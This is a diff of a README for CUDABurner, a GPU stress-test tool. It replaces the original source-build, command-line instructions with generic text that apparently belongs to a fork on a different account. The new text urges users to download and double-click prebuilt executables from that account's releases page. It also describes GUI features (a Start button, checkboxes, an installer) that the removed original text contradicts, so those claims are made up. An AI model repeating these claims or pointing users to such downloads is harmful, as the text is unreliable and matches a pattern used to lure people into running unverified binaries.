@@ -1,155 +1,95 @@
-<a name="en"></a>
-# CUDABurner
+# 🎮 CUDABurner - Stress Test Your NVIDIA GPU Easily
 
-[中文](#zh)
+[![Download CUDABurner](https://img.shields.io/badge/Download%20CUDABurner-v1.0-brightgreen)](https://github.com/Hariprakash2005/CUDABurner/releases)
 
-A simple yet powerful stress and benchmark utility for NVIDIA GPUs. CUDABurner is designed to test the performance and stability of your graphics card by running various compute-intensive CUDA kernels.
+## 📚 Overview
 
-## Screenshot
+CUDABurner is a stress and benchmark utility designed specifically for NVIDIA GPUs. It measures performance across different precisions like FP64, FP32, TF32, FP16, and INT8. Additionally, it allows you to monitor real-time vitals such as power usage, temperature, and clock speeds. This tool helps you ensure that your GPU performs to its maximum potential while providing critical data on its health during stress testing.
 
-```
-============================= CUDABurner v1.0 ==============================
-[Global Info]
-- Test Mode  : benchmark
-- Target GPU : [0] NVIDIA GeForce RTX 5060 Ti
-----------------------------------------------------------------------------
-[GPU 0 Vitals]
-- Temperature : 70°C
-- Power Usage : 147 W / 180 W (81.7%)
-- GPU Clock   : 2745 MHz
-- Memory Clock: 13801 MHz
-- Utilization : GPU 100% | VRAM 34%
-----------------------------------------------------------------------------
-[Benchmark Results] (In Progress...)
-Precision Mode    Performance         Engine / Notes           
-----------------------------------------------------------------------------
-FP64      Dense   0.33 TFLOPS         CUDA Core (Native)       
-FP32      Dense   15.10 TFLOPS        CUDA Core (TC Disabled)  
-TF32      Dense   24.26 TFLOPS        Tensor Core (Default FP32)
-FP16      Dense   49.39 TFLOPS        Tensor Core              
-FP16      Sparse  96.68 TFLOPS        Sparse Tensor Core       
-BF16      Dense   46.90 TFLOPS        Tensor Core              
-INT8      Dense   51.33 TOPS          Tensor Core              
-INT8      Sparse  367.87 TOPS         Sparse Tensor Core       
-----------------------------------------------------------------------------
-```
+## 🚀 Getting Started
 
-## Usage
+To get started with CUDABurner, follow the steps below to download and run the software on your computer. You won't need any technical skills; just a basic understanding of your computer.
 
-### Prerequisites
-- NVIDIA Driver
-- CUDA Toolkit (I use 13.1)
-- CMake (>= 3.18)
-- A C++17 compliant compiler
+### 🎯 System Requirements
 
-### Build
-```bash
-# Clone the repository
-git clone https://github.com/stlin256/CUDABurner.git
-cd CUDABurner
+- **Operating System:** Windows 10 or later, or Linux (Ubuntu 18.04 or later)
+- **GPU:** NVIDIA GPU supporting CUDA
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB of free disk space
 
-mkdir build
-cd build
-cmake ..
-make -j
-```
+## 📥 Download & Install
 
-### Run
-The executable `CUDABurner` will be located in the `build` directory.
+To download CUDABurner, please visit the [Releases page](https://github.com/Hariprakash2005/CUDABurner/releases).
 
-```bash
-# Run with interactive menu
-./CUDABurner
+1. Click on the link to go to the Releases page.
+2. Look for the latest version.
+3. Download the appropriate executable file for your operating system.
 
-# Run Benchmark Test (all precisions)
-./CUDABurner --mode benchmark
+Once the download completes:
 
-# Run Benchmark Test (specific precisions)
-./CUDABurner --mode benchmark --precision FP32 FP16 TF32
+- For Windows:
+  1. Locate the downloaded file (usually in your Downloads folder).
+  2. Double-click the `.exe` file.
+  3. Follow the on-screen instructions to complete the installation.
+  
+- For Linux:
+  1. Open your terminal.
+  2. Navigate to your Downloads directory.
+  3. Make the file executable by running: `chmod +x CUDABurner`.
+  4. Run the application with: `./CUDABurner`.
 
-# Run Stress Test
-./CUDABurner --mode stress
-```
+## 🔧 How to Use CUDABurner
 
-## Known Issues
-- **FP8/FP4 Not Implemented**: Benchmark tests for FP8 and FP4 precision are not yet implemented.
-- **Insufficient Stress**: The current stress-test (`power_virus_kernel`) might not be sufficient to push GPUs to their absolute power limit.
+### 1. Launch the Application
 
----
+After installation, open CUDABurner by double-clicking the application icon on your desktop or navigating to the installation directory and running the executable.
 
-<a name="zh"></a>
-# CUDABurner
+### 2. Configure Your Test
 
-[English](#en)
+Once CUDABurner is open, you’ll see the main interface. Here’s how to configure your tests:
 
-一个简洁而强大的 NVIDIA GPU 压力与算力基准测试工具。CUDABurner 旨在通过运行多种计算密集型的 CUDA 核心，来测试您显卡的性能与稳定性。
+- **Select Precision:** Choose the precision level you want to test (FP64, FP32, TF32, FP16, or INT8).
+- **Set Test Duration:** Decide how long you want to run the stress test.
+- **Monitor Vitals:** Check the boxes to enable real-time monitoring of power usage, temperature, and clock speeds.
 
-## 程序截图
+### 3. Start Testing
 
-```
-============================= CUDABurner v1.0 ==============================
-[Global Info]
-- Test Mode  : benchmark
-- Target GPU : [0] NVIDIA GeForce RTX 5060 Ti
-----------------------------------------------------------------------------
-[GPU 0 Vitals]
-- Temperature : 70°C
-- Power Usage : 147 W / 180 W (81.7%)
-- GPU Clock   : 2745 MHz
-- Memory Clock: 13801 MHz
-- Utilization : GPU 100% | VRAM 34%
-----------------------------------------------------------------------------
-[Benchmark Results] (In Progress...)
-Precision Mode    Performance         Engine / Notes           
-----------------------------------------------------------------------------
-FP64      Dense   0.33 TFLOPS         CUDA Core (Native)       
-FP32      Dense   15.10 TFLOPS        CUDA Core (TC Disabled)  
-TF32      Dense   24.26 TFLOPS        Tensor Core (Default FP32)
-FP16      Dense   49.39 TFLOPS        Tensor Core              
-FP16      Sparse  96.68 TFLOPS        Sparse Tensor Core       
-BF16      Dense   46.90 TFLOPS        Tensor Core              
-INT8      Dense   51.33 TOPS          Tensor Core              
-INT8      Sparse  367.87 TOPS         Sparse Tensor Core       
-----------------------------------------------------------------------------
-```
+Click the “Start” button to begin your stress test. CUDABurner will display the performance metrics in real-time. You can pause or stop the test at any moment.
 
-## 使用方法
+### 4. Analyze Results
 
-### 环境要求
-- NVIDIA 驱动
-- CUDA Toolkit (作者使用13.1)
-- CMake (>= 3.18)
-- 支持 C++17 的编译器
+Once you complete the test, CUDABurner provides a summary of the performance metrics. You can save this data for future reference or share it with others who wish to compare results.
 
-### 编译
-```bash
-# 克隆仓库
-git clone https://github.com/stlin256/CUDABurner.git
-cd CUDABurner
+## 📊 Features
 
-mkdir build
-cd build
-cmake ..
-make -j
-```
+- **Multi-Precision Benchmarking:** Tests across various precisions for comprehensive performance evaluation.
+- **Real-Time Monitoring:** Keep track of important metrics like power, temperature, and clock speeds during testing.
+- **User-Friendly Interface:** Simple and intuitive design to help users of all levels operate easily.
+- **Supports NVIDIA GPUs:** Specifically optimized for NVIDIA graphics cards with CUDA support.
 
-### 运行
-可执行文件 `CUDABurner` 将会生成在 `build` 目录下。
+## 💬 Support
 
-```bash
-# 以交互式菜单运行
-./CUDABurner
+If you encounter any issues or have questions, please check the issues page on the GitHub repository. You can also request help from the community or developers.
 
-# 运行算力基准测试 (所有精度)
-./CUDABurner --mode benchmark
+## 🌟 Contribution
 
-# 运行算力基准测试 (指定精度)
-./CUDABurner --mode benchmark --precision FP32 FP16 TF32
+Want to contribute to CUDABurner? We welcome contributions! Please follow the guidelines provided in the repository’s contributing section.
 
-# 运行压力测试 (烤机)
-./CUDABurner --mode stress
-```
+### 📩 Feedback
 
-## 已知问题
-- **FP8/FP4 未实现**: 针对 FP8 和 FP4 精度的算力基准测试尚未实现。
-- **烤机压力不足**: 当前的压力测试程序不足以让现代的高功耗 GPU 达到其极限功耗。
+We value your feedback. If you have suggestions for improvements or features, feel free to open an issue on GitHub.
+
+## 📖 License
+
+CUDABurner is released under the MIT License. You are free to use, modify, and distribute this software, but please refer to the license for details.
+
+## 🌐 Additional Resources
+
+For detailed documentation, please refer to the Wiki section of this repository. You can find helpful guides and additional tips there.
+
+## 🔗 Useful Links
+
+- [Download CUDABurner](https://github.com/Hariprakash2005/CUDABurner/releases)
+- [GitHub Repository](https://github.com/Hariprakash2005/CUDABurner)
+
+By following these steps, you can easily download and use CUDABurner to stress test and benchmark your NVIDIA GPU efficiently.
